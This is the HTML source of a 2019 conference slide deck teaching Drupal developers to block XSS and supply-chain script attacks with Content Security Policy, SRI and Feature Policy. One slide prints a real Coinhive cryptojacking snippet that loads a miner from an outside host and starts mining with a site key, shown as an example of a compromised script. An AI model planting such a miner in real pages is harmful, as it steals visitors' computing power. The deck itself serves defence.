@@ -1,0 +1,1049 @@
+<!doctype html>
+<html lang="en-CA" prefix="og: http://ogp.me/ns#">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>XSS Protection with Content Security Policy</title>
+
+	<link rel="stylesheet" href="lib/fontawesome/css/fontawesome.css">
+	<link rel="stylesheet" href="lib/fontawesome/css/brands.css">
+	<link rel="stylesheet" href="lib/fontawesome/css/solid.css">
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/myplanet.css">
+	<link rel="stylesheet" href="css/presentation.css">
+	<link rel="stylesheet" href="css/slides.css">
+
+	<!-- Theme used for syntax highlighting of code -->
+	<link rel="stylesheet" href="lib/css/highlight-github.css">
+
+	<link rel="icon" href="lib/myplanet/logo/radiant-orange/mark-knockout.svg"/>
+
+	<meta property="og:url" content="https://gapple.github.io/presentation-csp-badcamp-2019/" />
+	<meta property="og:title" content="Bringing Content Security Policy to Drupal" />
+	<meta property="og:image" content="https://gapple.github.io/presentation-csp-badcamp-2019/images/facebook-card.png" />
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:creator" content="@gappleca">
+	<meta name="twitter:image" content="https://gapple.github.io/presentation-csp-badcamp-2019/images/twitter-card.png">
+
+	<script src="js/reveal-print.js"></script>
+</head>
+<body>
+<div class="reveal pattern--waterfall">
+	<div class="slides">
+		<section>
+			<section class="title" id="title">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo logo--full"><span class="visually-hidden">Myplanet</span></div>
+					</div>
+					<div class="content">
+						<div>
+							<h2>XSS Protection with</h2>
+							<h1>Content Security Policy</h1>
+						</div>
+						<div class="description">
+							BAD Camp 2019
+						</div>
+					</div>
+					<div class="credit">
+						<hr>
+						<div class="name">Geoff Appleby</div>
+					</div>
+					<a class="presentation-url" href="https://gapple.github.io/presentation-csp-badcamp-2019/">https://gapple.github.io/presentation-csp-badcamp-2019/</a>
+				</div>
+			</section>
+			<section class="about" id="about">
+				<div class="grid-wrapper">
+					<div class="content">
+						<img src="images/granfondo.jpg" />
+						<aside>
+							<h2>Geoff Appleby</h2>
+							<span class="country-flag">🇨🇦</span>
+							<hr>
+							<ul class="accounts">
+								<li class="drupal"><a href="https://www.drupal.org/u/gapple"><i class="fab fa-drupal"></i> <span>gapple</span></a></li>
+								<li class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></li>
+								<li class="instagram fragment" data-fragment-index="1"><a href="#"><i class="fab fa-instagram"></i> <span>gappleca</span></a></li>
+								<li class="strava fragment" data-fragment-index="1"><a href="#"><i class="fab fa-strava"></i> <span></span></a></li>
+							</ul>
+						</aside>
+					</div>
+				</div>
+				<div class="notes">
+					- 887th place
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section id="are-you-afraid" class="screenshot full">
+				<div class="grid-wrapper">
+					<video>
+						<source src="images/are-you-afraid.mp4" type="video/mp4" />
+					</video>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div>
+						<figure class="code">
+							<pre><code class="lang-html" data-escape>
+								&lt;script src="https://cdn.example.com/script.js" async&gt;&lt;/script&gt;
+							</code></pre>
+						</figure>
+
+						<figure id="coinhive" class="code fragment">
+							<pre><code class="lang-js">
+								/* [Warning] Do not copy or self host this file, you will not be supported */ <br/><br/>
+
+								<span class="fragment">
+								window["document"]["write"]("&lt;script type='text/javascript' src='https://coinhive.com/lib/coinhive.min.js?rnd="+window["Math"]["random"]()+"'&gt;&lt;/script&gt;");window["document"]["write"]('&lt;script&gt; if (navigator.hardwareConcurrency &gt; 1){ var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/3),throttle:0.6}} else { var cpuConfig = {threads: 8,throttle:0.6}} var miner = new CoinHive.Anonymous(\'1GdQGpY1pivrGlVHSp5P2IIr9cyTzzXq\', cpuConfig);miner.start();&lt;/script&gt;');
+								</span>
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+
+			<section id="do-you-know">
+				<div class="grid-wrapper">
+					<figure>
+						<span class="do-you-know--time">10<br/>PM</span>
+						<span class="do-you-know--where">Do you know where your data is?</span>
+					</figure>
+				</div>
+
+				<aside class="notes">
+					- Ecommerce collecting CC info
+					- or a certain presidential campaign accepting donations
+				</aside>
+			</section>
+
+			<section id="magecart" class="screenshot full">
+				<img src="images/magecart.png" alt="Article about credit card theft via JavaScript malware"/>
+			</section>
+
+			<section id="harvesting-cc" class="screenshot full">
+				<img src="images/harvesting-cc.png" alt="Article about JavaScript supply chain compromise"/>
+			</section>
+
+			<section class="references">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<span>References</span>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<ul>
+						<li><a href="https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5 ">I’m harvesting credit card numbers and passwords from your site. Here’s how.<br> - David Gilbertson</a></li>
+						<li><a href="https://www.troyhunt.com/the-javascript-supply-chain-paradox-sri-csp-and-trust-in-third-party-libraries/ ">The JavaScript Supply Chain Paradox: SRI, CSP and Trust in Third Party Libraries<br> - Troy Hunt</a></li>
+						<li><a href="https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/">Protect your site from Cryptojacking with CSP + SRI<br> - Scott Helme</a></li>
+						<li><a href="https://medium.com/@efkan162/how-i-xssed-uber-and-bypassed-csp-9ae52404f4c5">How I XSS’ed Uber and Bypassed CSP<br> - Efkan</a></li>
+						<li><a href="https://krebsonsecurity.com/2018/11/whos-in-your-online-shopping-cart/">Who’s In Your Online Shopping Cart?<br> - KrebsOnSecurity</a></li>
+						<li><a href="https://www.tripwire.com/state-of-security/featured/magecart-hundreds-websites-supply-chain-hijack/">Magecart hits hundreds of websites via ad supply chain hijack<br> - Graham Cluley</a></li>
+					</ul>
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section id="security-layers" class="screenshot full cover">
+				<div class="grid-wrapper">
+					<figure class="meme shrek-like-an-onion">
+						<img src="images/onion-layers/000.png" alt="Web security is like an onion" />
+						<h1>Web security is like an onion</h1>
+					</figure>
+					<figure class="meme shrek-it-stinks fragment">
+						<img src="images/onion-layers/002.png" alt="It stinks?" />
+						<h1>It stinks?</h1>
+					</figure>
+					<figure class="meme shrek-layers fragment">
+						<img src="images/onion-layers/004.png" alt="Layers!" />
+						<h1>Layers!</h1>
+					</figure>
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<ul>
+						<li>Input validation</li>
+						<li>Text Formats / <code>check_plain()</code> / <code>filter_xss_admin()</code></li>
+						<li>Twig escaping</li>
+						<li>Libraries API & <code>drupalSettings</code></li>
+					</ul>
+				</div>
+			</section>
+			<section id="write-insecure-code" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/write-insecure-code.png" alt="Presentation on writing insecure code for Drupal by Sam Mortenson"/>
+				</div>
+			</section>
+			<section id="xss-titlefield" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/xss-titlefield.png" alt="Drupal node creation page, with XSS attempt in the title field"/>
+					<div class="fragment xss-titlefield--highlight"></div>
+				</div>
+			</section>
+			<section id="security-advisory" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/security-advisory.png" alt="Drupal XSS Security Advisory"/>
+				</div>
+			</section>
+			<section id="xss-admin" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/xss-admin.png" alt="Drupal administration page, with field for script to be added inline on every page"/>
+				</div>
+			</section>
+
+			<section class="references">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<span>References</span>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<ul>
+						<li><a href="http://slides.com/mortenson/drupal8security#/3">How to write insecure Drupal 8 code<br> - Samuel Mortenson</a></li>
+						<li><a href="https://medium.com/myplanet-musings/a-different-approach-to-google-analytics-for-drupal-8-d9c3de218edf">A different approach to Google Analytics for Drupal 8<br> - Geoff Appleby</a></li>
+					</ul>
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section class="subsection">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<h1>The HTTP Content-Security-Policy response header allows web site administrators to control
+						resources the user agent is allowed to load for a given page.
+					</h1>
+					<div class="description">
+						<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">MDN web docs: Content-Security-Policy</a>
+					</div>
+				</div>
+			</section>
+			<section id="csp-support" class="support">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure>
+						<table>
+							<tr class="browsers">
+								<th></th>
+								<th><i class="fab fa-chrome"></i></th>
+								<th><i class="fab fa-firefox"></i></th>
+								<th><i class="fab fa-safari"></i></th>
+								<th><i class="fab fa-edge"></i></th>
+								<th><i class="fab fa-internet-explorer"></i></th>
+							</tr>
+							<tr class="level2">
+								<th>2</th>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+							</tr>
+							<tr class="level3 fragment">
+								<th>3</th>
+								<td><i class="fa fa-check warning"></i></td>
+								<td><i class="fa fa-check warning"></i></td>
+								<td><i class="fa fa-times warning"></i></td>
+								<td><i class="fa fa-times warning"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+							</tr>
+						</table>
+					</figure>
+				</div>
+				<aside class="notes">
+					Level 1 Published February 2015
+					Level 2 Published December 2016
+					Most recent browser to add support was Edge in 2015
+					IE only supports sandbox directive
+				</aside>
+			</section>
+			<section id="basic-directives">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<ul>
+							<li>
+								<code>default-src</code>
+								<ul>
+									<li><code>script-src</code></li>
+									<li><code>style-src</code></li>
+									<li class="fragment" data-fragment-index="1"><code>font-src</code></li>
+									<li class="fragment" data-fragment-index="1"><code>img-src</code></li>
+									<li class="fragment" data-fragment-index="1"><code>media-src</code></li>
+									<li class="fragment" data-fragment-index="1"><code>connect-src</code></li>
+								</ul>
+							</li>
+							<li class="fragment" data-fragment-index="2"><code>frame-ancestors</code></li>
+						</ul>
+					</div>
+				</div>
+				<aside class="notes">
+					- X-Frame-Options
+				</aside>
+			</section>
+		</section>
+
+		<section>
+			<section id="umami-install" class="screenshot full" data-autoslide="8000">
+				<div class="grid-wrapper">
+					<video>
+						<source src="images/umami-site/install.mp4" />
+					</video>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/installed.png" />
+				</div>
+			</section>
+			<section id="trade-federation" class="screenshot full" data-autoslide="3800">
+				<div class="grid-wrapper">
+					<video>
+						<source src="images/trade-federation-doors.mp4" type="video/mp4" />
+					</video>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy: default-src 'none'
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/default-src-none.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy: default-src 'self'
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/default-src-self.png" />
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/default-src-self-console.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy:
+								default-src 'self';
+								style-src 'self' https://fonts.googleapis.com
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/style-src-google.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy:
+								default-src 'self';
+								style-src 'self' https://fonts.googleapis.com;
+								font-src https://fonts.gstatic.com
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/umami-site/font-src-google.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy-Report-Only:
+								default-src 'self';
+								style-src 'self' https://fonts.googleapis.com;
+								font-src https://fonts.gstatic.com;
+								report-uri https://example.com/reporting/csp-ro
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module.png" />
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module/config.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-plaintext">
+								webfonts-scope-one:
+									remote: https://fonts.google.com
+									license:
+									name: SIL Open Font License, Version 1.1
+									url: http://scripts.sil.org/OFL_web
+									gpl-compatible: false
+									css:
+										theme:
+											'https://fonts.googleapis.com/css?family=Scope+One': { type: external, minified: true }
+							</code></pre>
+							<figcaption class="path">umami.libraries.yml</figcaption>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module/auto-sources.png" />
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module/reporting.png" />
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module/sitelog-report.png" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-plaintext">
+								Content-Security-Policy:
+									default-src https: 'unsafe-inline';
+									report-uri https://example.test/report-uri/csp
+
+								Content-Security-Policy-Report-Only:
+									default-src: 'self';
+									report-uri https://example.test/report-uri/csp-ro
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/csp-module/report-uri-wizard.png" />
+				</div>
+			</section>
+		</section>
+		<section>
+			<section class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/core-ckeditor-csp.png" alt="Drupal core issue for CKEditor 4 requiring unsafe-inline CSP policy" />
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-plaintext">
+								Content-Security-Policy:
+									script-src 'self' 'unsafe-inline' cdn.example.com
+									script-src-elem 'self' cdn.example.com
+									script-src-attr 'unsafe-inline'
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section id="inline-load-api">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-html" data-escape>
+								&lt;script&gt;
+								(function(i,s,o,g,r,a,m){
+								  i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},
+								  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+								})(window,document,'script','https://cdn.example.com/script.js','api');
+
+								api('call');
+								&lt;/script&gt;
+							</code></pre>
+						</figure>
+						<div class="fragment" data-fragment-index="1">Replace with</div>
+						<figure class="code fragment" data-fragment-index="1">
+							<pre><code class="lang-html" data-escape>
+								&lt;script src="https://cdn.example.com/script.js" async&gt;&lt;/script&gt;
+								&lt;script src="/api-call.js"&gt;&lt;/script&gt;
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+				<aside class="notes">
+					- Google Analytics, Facebook JS API, Twitter JS API
+					- async attribute supported since IE 10
+				</aside>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-js">
+								window.api=window.api||function(){(api.q=api.q||[]).push(arguments)};
+
+								(function (drupalSettings) {
+
+									api(drupalSettings.api.data);
+
+								})(drupalSettings);
+							</code></pre>
+							<figcaption class="path">api-call.js</figcaption>
+						</figure>
+					</div>
+				</div>
+				<aside class="notes">
+					- Google Analytics, Facebook JS API, Twitter JS API
+					- async attribute supported since IE 10
+				</aside>
+			</section>
+			<section id="googalytics" class="screenshot full">
+				<div class="grid-wrapper">
+					<img src="images/ga.png" alt="Googalytics Drupal module project page" />
+				</div>
+			</section>
+			<section class="references">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<span>References</span>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<ul>
+						<li><a href="https://www.drupal.org/project/drupal/issues/2789139">[upstream] CSP requires 'unsafe-inline' because of CKEditor 4</a></li>
+						<li><a href="https://www.drupal.org/project/drupal/issues/2966864">Add CKEditor 5 and deprecate CKE 4 in Drupal 8, so that CKE 4 can be removed from Drupal 9</a></li>
+						<li><a href="https://www.drupal.org/project/csp/issues/2943432">Only apply 'unsafe' flags when dependent libraries are included on page</a></li>
+						<li><a href="https://www.troyhunt.com/locking-down-your-website-scripts-with-csp-hashes-nonces-and-report-uri/">Locking Down Your Website Scripts with CSP, Hashes, Nonces and Report URI - Troy Hunt</a></li>
+					</ul>
+				</div>
+			</section>
+		</section>
+		<section>
+			<section id="need-inline">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<div>"But I need this inline script"</div>
+						<div class="fragment">But do you <em>really?..</em></div>
+					</div>
+				</div>
+			</section>
+			<section id="allow-by-hash">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+								  script-src 'self' 'sha256-blLDIhKaPEZDhc4WD45BC7pZxW4WBRp7E5Ne1wC/vdw='
+							</code></pre>
+						</figure>
+					</div>
+					<aside class="notes">
+						- Only inline (CSP 2), external (CSP 3)
+					</aside>
+				</div>
+			</section>
+			<section id="allow-by-nonce">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div class="content">
+						<figure class="code">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+								  script-src 'self' 'nonce-TVIulFpP5Tk'
+							</code></pre>
+						</figure>
+						<figure class="code">
+							<pre><code class="lang-html" data-escape>
+								&lt;script nonce="{{ \Drupal\Component\Utility\Random::randomBytesBase64(8) }}"&gt;
+									// Inline script
+								&lt/script&gt;
+							</code></pre>
+						</figure>
+					</div>
+					<aside class="notes">
+						-  Edge doesn't allow for external scripts
+					</aside>
+				</div>
+			</section>
+		</section>
+
+		<section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<ul>
+						<li><code>/core/misc/ajax.js</code></li>
+						<li><code>/sites/default/files/js/js_0n_bTjxxl7PDgML9MC75S67L2ciCVCJJqWOFDReNw00.js</code></li>
+						<li><code>/sites/default/files/2019-10/script.js</code></li>
+					</ul>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div>
+						<figure class="code">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+									script-src example.com/core/ example.com/modules/ example.com/themes/
+										example.com/profiles/ example.com/libraries/ example.com/sites/default/files/js/;
+									style-src example.com/core/ example.com/modules/ example.com/themes/ 
+										example.com/profiles/ example.com/libraries/ example.com/sites/default/files/css/
+							</code></pre>
+						</figure>
+						<figure class="code fragment">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+									script-src assets.example.com;
+									style-src assets.example.com
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div>
+						<figure class="code">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+									script-src https://cdnjs.cloudflare.com
+							</code></pre>
+						</figure>
+						<figure class="code fragment">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+									script-src https://cdnjs.cloudflare.com/ajax/libs/jquery/
+							</code></pre>
+						</figure>
+						<figure class="code fragment">
+							<pre><code class="lang-plaintext" data-escape>
+								Content-Security-Policy:
+									script-src https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<div>
+						<figure class="code">
+							<pre><code class="lang-plaintext">
+								Content-Security-Policy:
+									script-src 'self' 'nonce-abcd1234'
+							</code></pre>
+						</figure>
+						<figure class="code">
+							<pre><code class="lang-html" data-escape>
+								&lt;script
+									src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"
+									nonce="abcd1234"
+								&gt;&lt;/script&gt;
+							</code></pre>
+						</figure>
+					</div>
+				</div>
+			</section>
+			<section class="references">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<span>References</span>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<ul>
+						<li><a href="https://scotthelme.co.uk/csp-nonces-the-easy-way-with-cloudflare-workers/">CSP nonces the easy way with Cloudflare Workers <br>-Scott Helme</a></li>
+					</ul>
+				</div>
+			</section>
+		</section>
+		
+		<section>
+			<section class="subsection">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<h1>Subresource Integrity (SRI)</h1>
+					<div class="description">
+						<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">MDN web docs: Subresource Integrity</a>
+					</div>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure class="code">
+						<pre><code class="lang-html">
+						&lt;script
+							src="https://cdn.example.com/1.2.3/framework.min.js"
+							integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+							crossorigin="anonymous"
+						&gt;&lt;/script&gt;
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Content-Security-Policy: require-sri-for script;
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section id="sri-support" class="support">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure>
+						<table>
+							<tr class="browsers">
+								<th></th>
+								<th><i class="fab fa-chrome"></i></th>
+								<th><i class="fab fa-firefox"></i></th>
+								<th><i class="fab fa-safari"></i></th>
+								<th><i class="fab fa-edge"></i></th>
+							</tr>
+							<tr>
+								<td></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check warning"></i></td>
+							</tr>
+						</table>
+					</figure>
+				</div>
+				<aside class="notes">
+
+				</aside>
+			</section>
+		</section>
+
+		<section>
+			<section class="subsection">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<h1>Feature Policy</h1>
+					<div class="description">
+						<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy">MDN web docs: Feature Policy</a>
+					</div>
+				</div>
+			</section>
+			<section>
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure class="code">
+						<pre><code class="lang-plaintext">
+							Feature-Policy:
+								camera 'none';
+								geolocation 'self';
+								microphone 'none'
+						</code></pre>
+					</figure>
+				</div>
+			</section>
+			<section id="fp-support" class="support">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<figure>
+						<table>
+							<tr class="browsers">
+								<th></th>
+								<th><i class="fab fa-chrome"></i></th>
+								<th><i class="fab fa-firefox"></i></th>
+								<th><i class="fab fa-safari"></i></th>
+								<th><i class="fab fa-edge"></i></th>
+							</tr>
+							<tr>
+								<td></td>
+								<td><i class="fa fa-check yes"></i></td>
+								<td><i class="fa fa-check warning"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+								<td><i class="fa fa-times no"></i></td>
+							</tr>
+						</table>
+					</figure>
+				</div>
+				<aside class="notes">
+					Firefox feature flag, limited directive support
+				</aside>
+			</section>
+		</section>
+
+		<section>
+			<section class="subsection">
+				<div class="grid-wrapper">
+					<div class="header">
+						<div class="logo"></div>
+						<div class="twitter"><a href="https://twitter.com/gappleca"><i class="fab fa-twitter"></i> <span>gappleca</span></a></div>
+					</div>
+					<h1>Reporting API</h1>
+					<div class="description">
+						<a href="https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API">MDN web docs: Reporting API</a>
+					</div>
+				</div>
